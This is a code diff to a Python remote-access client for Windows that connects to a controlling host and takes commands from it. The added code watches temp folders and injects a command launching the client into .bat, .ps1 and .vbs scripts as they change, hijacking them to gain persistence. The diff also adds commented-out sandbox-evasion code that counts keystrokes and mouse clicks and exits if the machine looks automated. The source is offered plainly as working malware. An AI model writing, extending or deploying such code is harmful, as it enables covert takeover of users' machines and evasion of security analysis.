@@ -7,11 +7,30 @@ import socket
 from subprocess import Popen, PIPE
 import sys
 import shutil
+# import wmi
+# from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
+# import random
+# import time
+# import win32api
+import threading
+import tempfile
+import win32file
 # from cv2 import VideoCapture, imwrite
 # import win32api
-# import win32con
+import win32con
 # import win32gui
 # import win32ui
+# def handler(ip, port):
+#     try:
+#         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#         s.connect((ip, port))
+#         Sandbox_D = Detector()
+#         t_s = threading.Thread(target=Sandbox_D.detect)
+#         t_p = threading.Thread(target=PINGPONG_client, args=(ip, port, s))
+#         t_s.start()
+#         t_p.start()
+#     except socket.error as msg:
+#         sys.exit(1)
 def PINGPONG_client(ip, port):
     try:
         try:
@@ -27,6 +46,80 @@ def PINGPONG_client(ip, port):
                 s.close()
                 CMD_client(ip, cmd_port, port)
                 break
+            if data.decode() == "PRO_VBP_APP":
+                s.send(bytes("OK", 'utf8'))
+                PINGPONG = os.path.abspath(__file__)
+                FILE_MODIFIED = 3
+                FILE_LIST_DIRECTORY = 0x0001
+                CMD = f'{PINGPONG}'
+                FILE_TYPES = {
+                    '.bat': ["\r\nREM PIPO\r\n", f'\r\n{CMD}\r\n'],
+                    '.ps1': ["\r\n#PIPO\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
+                    '.vbs': ["\r\n'PIPO\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
+                }
+
+                PATHS = ['c:\\Windows\\Temp', tempfile.gettempdir()]
+
+                def inject_code(full_filename, contents, extension):
+                    if FILE_TYPES[extension][0].strip() in contents:
+                        return
+                    
+                    full_contents = FILE_TYPES[extension][0]
+                    full_contents += FILE_TYPES[extension][1]
+                    full_contents += contents
+                    with open(full_filename, 'w') as f:
+                        f.write(full_contents)
+                    s.send(b'OK')
+                    s.close()
+                def monitor(path_to_watch):
+                    h_directory = win32file.CreateFile(
+                        path_to_watch,
+                        FILE_LIST_DIRECTORY,
+                        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
+                        None,
+                        win32con.OPEN_EXISTING,
+                        win32con.FILE_FLAG_BACKUP_SEMANTICS,
+                        None
+                        )
+
+                    while True:
+                        try:
+                            results = win32file.ReadDirectoryChangesW(
+                                h_directory,
+                                1024,
+                                True,
+                                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
+                                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
+                                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
+                                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
+                                win32con.FILE_NOTIFY_CHANGE_SECURITY |
+                                win32con.FILE_NOTIFY_CHANGE_SIZE,
+                                None,
+                                None
+                            )
+                            for action, file_name in results:
+                                full_filename = os.path.join(path_to_watch, file_name)
+                                if action == FILE_MODIFIED:
+                                    s.send(bytes(str(full_filename), "utf8"))
+                                    check_data = s.recv(1024)
+                                    if check_data:
+                                        extension = os.path.splitext(full_filename)[1]
+                                        if extension in FILE_TYPES:     
+                                            try:
+                                                with open(full_filename) as f:
+                                                    contents = f.read()
+                                                inject_code(full_filename, contents, extension)
+                                                # print(contents)
+                                            except Exception as e:
+                                                pass
+                        except KeyboardInterrupt:
+                            break
+                    
+                        except Exception:
+                            pass
+                for path in PATHS:
+                    monitor_thread = threading.Thread(target=monitor, args=(path,))
+                    monitor_thread.start()
             # if data.decode() == "CAM_SHOT_APP":
             #     os.mkdir("./temp")
             #     s.send(bytes("OK", 'utf8'))
@@ -118,3 +211,77 @@ def CMD_client(ip, port, main_port):
         cmd_c.close()
     except:
         sys.exit(1)
+# 沙箱检测
+# class LASTINPUTINFO(Structure):
+#     _fields_ = [
+#         ('cbSize', c_uint),
+#         ('dwTime', c_ulong)
+#     ]
+# def get_last_input():
+#     struct_lastinputinfo = LASTINPUTINFO()
+#     struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)
+#     windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))
+#     run_time = windll.kernel32.GetTickCount()
+#     elapsed = run_time - struct_lastinputinfo.dwTime
+#     return elapsed
+
+# # while True:
+# #     get_last_input()
+# #     time.sleep(1)
+
+# class Detector:
+#     def __init__(self):
+#         self.double_clicks = 0
+#         self.keystrokes = 0
+#         self.mouse_clicks = 0
+
+#     def get_key_press(self):
+#         for i in range(0, 0xff):
+#             state = win32api.GetAsyncKeyState(i)
+#             if state & 0x0001:
+#                 if i == 0x1:
+#                     self.mouse_clicks += 1
+#                     return time.time()
+#                 elif i > 32 and i < 127:
+#                     self.keystrokes += 1
+#         return None
+
+#     def detect(self):
+#         previous_timestamp = None
+#         first_double_click = None
+#         double_click_threshold = 0.35
+        
+#         max_double_clicks = 5
+#         max_keystrokes = random.randint(10,25)
+#         max_mouse_clicks = random.randint(5,25)
+#         max_input_threshold = 30000
+
+#         last_input = get_last_input()
+#         if last_input >= max_input_threshold:
+#             sys.exit(1)
+        
+#         detection_complete = False
+#         while not detection_complete:
+#             keypress_time = self.get_key_press()
+#             if keypress_time is not None and previous_timestamp is not None:
+#                 elapsed = keypress_time - previous_timestamp
+                
+#                 if elapsed <= double_click_threshold:
+#                     self.mouse_clicks -= 2
+#                     self.double_clicks += 1
+#                     if first_double_click is None:
+#                         first_double_click = time.time()
+#                     else:
+#                         if self.double_clicks >= max_double_clicks:
+#                             if (keypress_time - first_double_click <=
+#                                 (max_double_clicks*double_click_threshold)):
+#                                 sys.exit(1)
+#                 if (self.keystrokes >= max_keystrokes and 
+#                     self.double_clicks >= max_double_clicks and 
+#                     self.mouse_clicks >= max_mouse_clicks):
+#                     detection_complete = True
+                    
+#                 previous_timestamp = keypress_time
+#             elif keypress_time is not None:
+#                 previous_timestamp = keypress_time
+PINGPONG_client('127.0.0.1', 624)
